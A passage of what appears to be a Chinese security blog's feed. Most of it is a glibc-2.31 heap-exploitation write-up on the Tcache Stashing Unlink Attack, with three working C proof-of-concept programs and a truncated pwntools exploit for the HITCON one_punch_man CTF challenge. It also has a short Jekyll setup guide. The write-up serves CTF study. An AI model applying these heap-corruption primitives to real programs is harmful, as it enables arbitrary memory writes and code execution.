--worker-class gevent --access-logfile - --error-logfile -   41 ctfd      0:00 grep gunicorn</code></pre><p>后来在其他师傅博客上看到了<a href="https://www.52hertz.tech/2020/03/15/CTFd_second_develop/" target="_blank" rel="noopener">一篇完善 CTFd 功能的文章</a>，这边记录一下，以后有机会再实现。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/huchong/p/9844024.html" target="_blank" rel="noopener">https://www.cnblogs.com/huchong/p/9844024.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="ctfd" scheme="blog.b3ale.cn/tags/ctfd/"/>
    
  </entry>
  
  <entry>
    <title>macOS下使用Jekyll和Coding搭建博客</title>
    <link href="blog.b3ale.cn/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>blog.b3ale.cn/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2020-05-17T06:34:31.000Z</published>
    <updated>2020-05-17T07:53:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>仅作记录。</p><a id="more"></a><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>环境是 macOS Mojave，像是 command-line tools、ruby 之类的安装就不记录了。用的是 Coding 提供的静态网站服务，经过测试 jekyll 3.5 可以正常部署（版本过高在部署的时候会报错），依次安装对应的 bundle 和 jekyll：</p><pre><code class="bash">$ gem install bundle:1.15.4$ gem install -n /usr/local/bin/ jekyll -v &quot;3.5&quot;</code></pre><h1 id="Setup-Site"><a href="#Setup-Site" class="headerlink" title="Setup Site"></a>Setup Site</h1><p>先在 coding 上创建一个新的仓库，并开启静态网站服务，然后克隆到本地：</p><pre><code class="bash">$ git clone xxx.git blog &amp;&amp; cd blog</code></pre><p>接下来用 <code>jekyll new .</code> 在仓库中新建静态网站，并做相关的依赖安装，最后用 <code>jekyll build</code> 生成静态网站代码：</p><pre><code class="bash">$ bundle exec jekyll new .$ bundle install$ bundle exec jekyll build</code></pre><p>不看 git 的话，大概会有如下的文件。大致上和 hexo 的根目录差不了太多：</p><pre><code class="bash">$ find .../_posts./_posts/2020-05-17-welcome-to-jekyll.markdown./.sass-cache./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_syntax-highlighting.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_base.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_layout.scssc./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f/minima.scssc./404.html./.gitignore./index.md./_site./_site/feed.xml./_site/jekyll./_site/jekyll/update./_site/jekyll/update/2020./_site/jekyll/update/2020/05./_site/jekyll/update/2020/05/17./_site/jekyll/update/2020/05/17/welcome-to-jekyll.html./_site/index.html./_site/404.html./_site/about./_site/about/index.html./_site/assets./_site/assets/main.css./_site/assets/minima-social-icons.svg./_config.yml./Gemfile./Gemfile.lock</code></pre><p>可以用 <code>jekyll serve</code> 在本地对网站进行预览：</p><pre><code class="bash">$ bundle exec jekyll serve</code></pre><p>最后用 git 把代码同步到远程仓库，并在 coding 上进行部署即可：</p><pre><code class="bash">$ git add --all .$ git commit -m &quot;message&quot;$ git push origin master</code></pre><p>jekyll 默认主题比较简洁，我个人比较喜欢。但好像相比 hexo 对文章的管理要麻烦一点。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://jekyllrb.com/docs/installation/" target="_blank" rel="noopener">https://jekyllrb.com/docs/installation/</a><br><a href="https://www.jianshu.com/p/9f198d5779e6" target="_blank" rel="noopener">https://www.jianshu.com/p/9f198d5779e6</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;仅作记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macos" scheme="blog.b3ale.cn/tags/macos/"/>
    
      <category term="jekyll" scheme="blog.b3ale.cn/tags/jekyll/"/>
    
      <category term="coding" scheme="blog.b3ale.cn/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Stashing Unlink Attack</title>
    <link href="blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/"/>
    <id>blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/</id>
    <published>2020-05-05T11:03:01.000Z</published>
    <updated>2020-05-25T05:18:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>自 glibc-2.29 后 Unsortedbin Attack 已经不再适用，在 Tcache 机制上又出现了一种新的技术。</p><a id="more"></a><blockquote><p>本文基于 glibc-2.31（Ubuntu 20.04）。</p></blockquote><h1 id="Structure-amp-Functions"><a href="#Structure-amp-Functions" class="headerlink" title="Structure &amp; Functions"></a>Structure &amp; Functions</h1><p>主要根据源码来分析一下。首先，相比之前 2.27 的 tcache，现在的 tcache_entry 结构体新增了一个 key 字段；且 tcache_perthread_struct 中的 counts 字段从 uint8_t 变成了 uint16_t：</p><pre><code class="cpp">/* We overlay this structure on the user-data portion of a chunk when   the chunk is stored in the per-thread cache.  */typedef struct tcache_entry{  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;} tcache_entry;/* There is one of these for each thread, which contains the   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping   overall size low is mildly important.  Note that COUNTS and ENTRIES   are redundant (we could have just counted the linked list each   time), this is for performance reasons.  */typedef struct tcache_perthread_struct{  uint16_t counts[TCACHE_MAX_BINS];  tcache_entry *entries[TCACHE_MAX_BINS];} tcache_perthread_struct;</code></pre><p>然后在 free 的时候新增了一段对 tcache 的 Double Free 的检测代码，先是检测 key 值是否等于 tcache，然后会遍历 tcache 来判断有没有重复 free：</p><pre><code class="cpp">    /* This test succeeds on double free.  However, we don&#39;t 100%       trust it (it also matches random payload data at a 1 in       2^&lt;size_t&gt; chance), so verify it&#39;s not an unlikely       coincidence before aborting.  */    if (__glibc_unlikely (e-&gt;key == tcache))      {        tcache_entry *tmp;        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx];         tmp;         tmp = tmp-&gt;next)          if (tmp == e)        malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);        /* If we get here, it was a coincidence.  We&#39;ve wasted a           few cycles, but don&#39;t abort.  */      }</code></pre><p>在 tcache_put 中也新增了对 key 字段的存储，用于后面对 Double Free 的检查：</p><pre><code class="cpp">/* Caller must ensure that we know tc_idx is valid and there&#39;s room   for more chunks.  */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}</code></pre><p>在 Fastbins 处理过程中新增了一个 Stash 机制，每次从 Fastbins 取 Chunk 的时候会把剩下的 Chunk 全部依次放进对应的 tcache，直到 Fastbins 空或是 tcache 满：</p><pre><code class="cpp">#if USE_TCACHE          /* While we&#39;re here, if we see other chunks of the same size,         stash them in the tcache.  */          size_t tc_idx = csize2tidx (nb);          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        {          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = *fb) != NULL)            {              if (SINGLE_THREAD_P)            *fb = tc_victim-&gt;fd;              else            {              REMOVE_FB (fb, pp, tc_victim);              if (__glibc_unlikely (tc_victim == NULL))                break;            }              tcache_put (tc_victim, tc_idx);            }        }#endif</code></pre><p>然后是 Smallbins 解链的部分这里，根据大小确定 idx 并找到 Smallbins 对应的地址 bin。然后将 victim 设置为 bin 的 bk 所指向的 Chunk（根据 FIFO，即为最先放入的 Chunk），并判断 victim 的 bk 的 fd（bck 的 fd）是否指回 victim，即是否构成双向链表。接下来设置 victim 的 prev_inuse 位，并将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出：</p><pre><code class="cpp">   /*     If a small request, check regular bin.  Since these &quot;smallbins&quot;     hold one size each, no searching within bins is necessary.     (For a large request, we need to wait until unsorted chunks are     processed to find best fit. But for small ones, fits are exact     anyway, so we can check now, which is faster.)   */  if (in_smallbin_range (nb))    {      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        {          bck = victim-&gt;bk;      if (__glibc_unlikely (bck-&gt;fd != victim))        malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;</code></pre><p>接下来是 Smallbins 后面对 tcache 的使用。和前面一样先是定位到对应 tcache 的 idx，然后判断 tcache 中的 Chunk 数量以及第一个 tc_victim 是否和 bin 构成双向链表。并且和 Fastbins 一样，把 Smallbins 中剩下的 Chunk 放进对应的 tcache 中：</p><pre><code class="cpp">#if USE_TCACHE      /* While we&#39;re here, if we see other chunks of the same size,         stash them in the tcache.  */      size_t tc_idx = csize2tidx (nb);      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        {          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks over.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        {          if (tc_victim != 0)            {              bck = tc_victim-&gt;bk;              set_inuse_bit_at_offset (tc_victim, nb);              if (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                }        }</code></pre><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h2><p>根据前面分析的部分，<code>bck-&gt;fd = bin;</code> 这句代码可以达到和 Unsortedbin Attack 类似的效果，可以将一个 main_arena 中的地址（bin）写入指定位置（bck-&gt;fd）。这种 Smallbins 解链方式类似于远古版本的无检测 unlink ，就此也产生了新的利用方式，目前适用于所有带 tcache 的 glibc 版本。操作大概如下：</p><ol><li>先放入 2 个 Chunk 到 Smallbins，6 个 Chunk 到对应的 tcache；</li><li>然后在不破坏 fd 的情况下将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10。这样当再向 Smallbins 申请对应大小的 Chunk 时（使用 calloc 就不会请求 tcache），先放入 Smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。<code>bck = tc_victim-&gt;bk;</code> 此时的 bck 就是目标地址减 0x10，之后 <code>bck-&gt;fd = bin;</code> 也就是将目标地址上的值赋为 bin，这样就实现了等价于 Unsortedbin Attack 的操作；</li><li>之后调用 tcache_put 把后放入 Smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。</li></ol><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;uint64_t victim = 0;int main() {    int i;    void *p, *q, *padding;    fprintf(stderr, &quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;);    fprintf(stderr, &quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;);    p = malloc(0x18);    fprintf(stderr, &quot;[+] victim&#39;s address =&gt; %p, victim&#39;s vaule =&gt; 0x%lx\n&quot;, &amp;victim, victim);    fprintf(stderr, &quot;[+] heap address =&gt; %p\n&quot;, (uint64_t)p - 0x260);    fprintf(stderr, &quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;);       fprintf(stderr, &quot;Here, I choose 0x60\n&quot;);    for (i = 0; i &lt; 6; i++) {        p = calloc(1, 0x58);        free(p);    }    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        p, (uint64_t)p - 0x60, (uint64_t)p - 0x60 * 2, (uint64_t)p - 0x60 * 3, (uint64_t)p - 0x60 * 4, (uint64_t)p - 0x60 * 5);    fprintf(stderr, &quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;);    p = malloc(0x428);    fprintf(stderr, &quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;, p);    padding = malloc(0x28);    fprintf(stderr, &quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;, p);    free(p);    fprintf(stderr, &quot;Free chunk %p to unsortedbin\n&quot;, p);    malloc(0x428 - 0x60);    fprintf(stderr, &quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;);    malloc(0x108);    fprintf(stderr, &quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;);    fprintf(stderr, &quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;);    q = malloc(0x428);    padding = malloc(0x88);    free(q);    malloc(0x3c8);    malloc(0x108);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;, (uint64_t)p + 0x3c0, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;\n4. overwrite the first chunk in smallbin[4]&#39;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;);    fprintf(stderr, &quot;Change %p&#39;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)(&amp;victim) - 0x10);    *(uint64_t *)((uint64_t)q + 0x3c0 + 0x18) = (uint64_t)(&amp;victim) - 0x10;    printf(&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;);    calloc(1, 0x58);    printf(&quot;Finally, the victim&#39;s value is changed to a big number\n&quot;);    printf(&quot;Now, victim&#39;s value =&gt; 0x%lx\n&quot;, victim);    return 0;}</code></pre><h2 id="Tcache-Stashing-Unlink-Attack-Plus"><a href="#Tcache-Stashing-Unlink-Attack-Plus" class="headerlink" title="Tcache Stashing Unlink Attack Plus"></a>Tcache Stashing Unlink Attack Plus</h2><p>可以实现任意地址的分配，和上述布局大致相同，不过有细微差异。操作大概如下：</p><ol><li>放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache，后在不破坏 fd 的情况下将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；</li><li>在 stash 机制时，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin-&gt;bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 Smallbins 中。之后不满足终止条件，会进行下一次的 stash，这时的 tc_victim 就是目标地址；</li><li>接下来执行 <code>bck = tc_victim-&gt;bk; bck-&gt;fd = bin;</code>，将目标地址加 0x8 处的指针。最后目标地址就会被放入 tcache_entry 的头部，stash 满足终止条件而终止。</li></ol><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;static uint64_t victim[4] = {0, 0, 0, 0};int main() {    int i;    void *p, *q, *r, *padding;    fprintf(stderr, &quot;You can use this technique to get a tcache chunk to arbitrary address\n&quot;);    fprintf(stderr, &quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;);    p = malloc(0x18);    fprintf(stderr, &quot;[+] victim&#39;s address =&gt; %p, victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        &amp;victim, victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;[+] heap address =&gt; %p\n&quot;, (uint64_t)p - 0x260);    fprintf(stderr, &quot;\n2. change victim&#39;s data, make victim[1] = &amp;victim, or other address to writable address\n&quot;);    victim[1] = (uint64_t)(&amp;victim);    fprintf(stderr, &quot;victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;);    fprintf(stderr, &quot;Here, I choose the size 0x60\n&quot;);    for (i = 0; i &lt; 5; i++){        r = calloc(1, 0x58);        free(r);    }    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    fprintf(stderr, &quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;);    p = malloc(0x428);    fprintf(stderr, &quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;, p);    padding = malloc(0x28);    fprintf(stderr, &quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;, p);    free(p);    fprintf(stderr, &quot;Free chunk %p to unsortedbin\n&quot;, p);    malloc(0x3c8);    fprintf(stderr, &quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;);    malloc(0x108);    fprintf(stderr, &quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;);    fprintf(stderr, &quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;);    q = malloc(0x428);    padding = malloc(0x88);    free(q);    malloc(0x3c8);    malloc(0x108);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;\n5. overwrite the first chunk in smallbin[4]&#39;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;);    fprintf(stderr, &quot;Change %p&#39;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)(&amp;victim) - 0x10);    *(uint64_t *)(q + 0x3c0 + 0x18) = (uint64_t)(&amp;victim) - 0x10;    fprintf(stderr, &quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;);    calloc(1, 0x58);    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        &amp;victim, (uint64_t)q + 0x3d0, r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    printf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;);    p = malloc(0x58);    *(uint64_t *)((uint64_t)p) = 0xaa;    *(uint64_t *)((uint64_t)p + 0x8) = 0xbb;    *(uint64_t *)((uint64_t)p + 0x10) = 0xcc;    *(uint64_t *)((uint64_t)p + 0x18) = 0xdd;    printf(&quot;victim&#39;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    return 0;}</code></pre><h2 id="Tcache-Stashing-Unlink-Attack-Plus-Plus"><a href="#Tcache-Stashing-Unlink-Attack-Plus-Plus" class="headerlink" title="Tcache Stashing Unlink Attack Plus Plus"></a>Tcache Stashing Unlink Attack Plus Plus</h2><p>同时实现上面的两种功能。操作大概如下：</p><ol><li>将 Smallbins 里的 bk 设置为目标地址 1 减 0x10，将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。这样就可以将 tcache 分配到目标地址 1，同时向目标地址 2 写入一个大数字。</li></ol><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;uint64_t victim[4] = {0, 0, 0, 0};uint64_t target = 0;int main() {    int i;    void *p, *q, *r, *padding;    fprintf(stderr, &quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n&quot;);    fprintf(stderr, &quot;\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n&quot;);    p = malloc(0x18);    fprintf(stderr, &quot;[+] victim&#39;s address =&gt; %p, victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        &amp;victim, victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;[+] target&#39;s address =&gt; %p, target&#39;s value =&gt; 0x%lx\n&quot;,        &amp;target, target);    fprintf(stderr, &quot;[+] heap address =&gt; %p\n&quot;, (uint64_t)p - 0x260);    fprintf(stderr, &quot;\n2. change victim&#39;s data, make victim[1] = &amp;target-0x10\n&quot;);    victim[1] = (uint64_t)(&amp;target) - 0x10;    fprintf(stderr, &quot;victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;);    fprintf(stderr, &quot;Here, I choose 0x60\n&quot;);    for (i = 0; i &lt; 5; i++) {        r = calloc(1, 0x58);        free(r);    }    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    fprintf(stderr, &quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;);    p = malloc(0x428);    fprintf(stderr, &quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;, p);    padding = malloc(0x28);    fprintf(stderr, &quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;, p);    free(p);    fprintf(stderr, &quot;Free chunk %p to unsortedbin\n&quot;, p);    malloc(0x3c8);    fprintf(stderr, &quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;);    malloc(0x108);    fprintf(stderr, &quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;);    fprintf(stderr, &quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;);    q = malloc(0x428);    padding = malloc(0x88);    free(q);    malloc(0x3c8);    malloc(0x108);    fprintf(stderr, &quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;, (uint64_t)q + 0x3c0);    fprintf(stderr, &quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)p + 0x3c0);    fprintf(stderr, &quot;\n5. overwrite the first chunk in smallbin[4]&#39;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;);    fprintf(stderr, &quot;Change %p&#39;s bk pointer to &amp;victim-0x10 address =&gt; 0x%lx\n&quot;, (uint64_t)q + 0x3c0, (uint64_t)(&amp;victim) - 0x10);    *(uint64_t *)((uint64_t)q + 0x3c0 + 0x18) = (uint64_t)(&amp;victim) - 0x10;    fprintf(stderr, &quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;);    calloc(1, 0x58);    fprintf(stderr, &quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;,        &amp;victim, (uint64_t)q + 0x3d0, r, (uint64_t)r - 0x60, (uint64_t)r - 0x60 * 2, (uint64_t)r - 0x60 * 3, (uint64_t)r - 0x60 * 4);    fprintf(stderr, &quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;);    p = malloc(0x58);    *(uint64_t *)((uint64_t)p) = 0xaa;    *(uint64_t *)((uint64_t)p + 0x8) = 0xbb;    *(uint64_t *)((uint64_t)p + 0x10) = 0xcc;    *(uint64_t *)((uint64_t)p + 0x18) = 0xdd;    fprintf(stderr, &quot;victim&#39;s vaule =&gt; [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;,        victim[0], victim[1], victim[2], victim[3]);    fprintf(stderr, &quot;target&#39;s value =&gt; 0x%lx\n&quot;, target);    return 0;}</code></pre><h2 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h2><p>总结一下，可以进行利用的最基本条件如下：</p><ol><li>可以获得堆的地址；</li><li>可以修改 Smallbins 中 Chunk 的 bk 字段。</li></ol><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>记录一些漏洞相关的题目。在参考网站中记录了很多讲得很好的博客，这里对题目等的描述就直接略过了。</p><blockquote><p>在实际做题过程中发现 glibc-2.29 和 glibc-2.31 下的题目 IDA 不能很好地反编译 switch 语句，比较推荐用 Ghidra 或是 Cutter。</p></blockquote><h2 id="2019-HITCON-one-punch-man（tcache-stashing-unlink-attack）"><a href="#2019-HITCON-one-punch-man（tcache-stashing-unlink-attack）" class="headerlink" title="2019-HITCON-one_punch_man（tcache stashing unlink attack）"></a>2019-HITCON-one_punch_man（tcache stashing unlink attack）</h2><blockquote><p>环境：Ubuntu 20.04（VMware Fusion）<br>原本程序加了 seccomp filter，因为主要是复现新技术，就将对应的代码 patch 掉了；同时题目中的隐藏函数只有在 tache 0x220 对应的 count 大于 6 时才能调用，但因为用的是 glibc-2.31 的环境，count 字段从 1 个字节变为了 2 个字节，偏移就对不上了，所以这里也把对应的 if 语句 patch 掉了。</p></blockquote><p>在 debut 时发现不能用 fastbins，而且调用的是 calloc（不从 tcache 拿），然后在隐藏函数中调用 malloc，如果我们在 tcache 中布置好对应的 Chunk，就能用 malloc 取到对应的 Chunk：</p><pre><code class="cpp">unsigned __int64 __fastcall debut(__int64 a1, __int64 a2){  unsigned int idx; // [rsp+8h] [rbp-418h]  signed int len; // [rsp+Ch] [rbp-414h]  char s[1032]; // [rsp+10h] [rbp-410h]  unsigned __int64 v6; // [rsp+418h] [rbp-8h]  v6 = __readfsqword(0x28u);  write_buf(&quot;idx: &quot;);  idx = read_int();  if ( idx &gt; 2 )    error((__int64)&quot;invalid&quot;);  write_buf(&quot;hero name: &quot;);  memset(s, 0, 0x400uLL);  len = read(0, s, 0x400uLL);  if ( len &lt;= 0 )    error((__int64)&quot;io&quot;);  s[len - 1] = 0;  if ( len &lt;= 0x7F || len &gt; 0x400 )    error((__int64)&quot;poor hero name&quot;);  *((_QWORD *)&amp;unk_4040 + 2 * idx) = calloc(1uLL, len);  qword_4048[2 * idx] = len;  strncpy(*((char **)&amp;unk_4040 + 2 * idx), s, len);  memset(s, 0, 0x400uLL);  return __readfsqword(0x28u) ^ v6;}__int64 __fastcall punch(__int64 a1, __int64 a2){  __int64 v2; // rax  void *buf; // [rsp+8h] [rbp-8h]  v2 = *(unsigned __int8 *)(qword_4030 + 0x20);  buf = malloc(0x217uLL);  if ( !buf )    error((__int64)&quot;err&quot;);  if ( read(0, buf, 0x217uLL) &lt;= 0 )    error((__int64)&quot;io&quot;);  puts(&quot;Serious Punch!!!&quot;);  puts(&amp;unk_2128);  return puts(buf);}</code></pre><p>free 的时候存在 Use After Free：</p><pre><code class="cpp">void __fastcall retire(__int64 a1, __int64 a2){  unsigned int v2; // [rsp+Ch] [rbp-4h]  write_buf(&quot;idx: &quot;);  v2 = read_int();  if ( v2 &gt; 2 )    error((__int64)&quot;invalid&quot;);  free(*((void **)&amp;unk_4040 + 2 * v2));}</code></pre><p>依次泄漏 heap 和 libc，然后构造用于 tcache stashing unlink attack 的两个 smallbins，最后就可以直接改 free_hook 为 system（因为我已经把 seccomp filter 给 patch 了）。Exploit：</p><pre><code class="python">#!/usr/bin/env python3from pwn import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./one_punch&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;&gt; &#39;)    p.sendline(str(c))def new(idx, name):    cmd(1)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;hero name: &#39;)    p.send(name)    sleep(0.1)def edit(idx, name):    cmd(2)    p.recvuntil(&#39;idx: 